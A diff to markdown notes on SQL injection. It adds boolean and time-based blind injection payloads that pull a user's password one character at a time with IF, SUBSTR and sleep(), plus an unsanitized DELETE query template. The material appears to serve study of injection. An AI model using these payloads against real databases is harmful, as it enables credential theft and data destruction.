@@ -43,12 +43,20 @@ PRINT 'a' + CHAR(10) + 'b' -- line feed
 PRINT 'a' + CHAR(11) + 'b' -- vertical tab 
 PRINT 'a' + CHAR(13) + 'b' -- carriage return
 ```
+
 - Attacking with IF and SUBSTRNG statements
 > SUBSTRING() extracts a character from a string via its index
 
 ```
 0' or userid=if([condition],'1','0'); -- - 
 0' or userid=if((select substr(password,1,1) from user where userid='1')='a','1','0'); -- - 
-0' or userid=if((select substr(password,1,1) from user where userid='1')='a',sleep(0))
+0' or userid=if((select substr(password,1,1) from user where userid='1')='b','1','0'); -- - 
 
+1' or userid=if((select substr(password,1,1) from user where userid='1')='a',sleep(0.3),'0'); -- - 
+1' or userid=if((select substr(password,1,1) from user where userid='1')='abc',sleep(0.3),'0'); -- - 
+```
+
+**More attack scenarios:**
+- `delete from user where userid = '${userid}$'`
+```
 ```
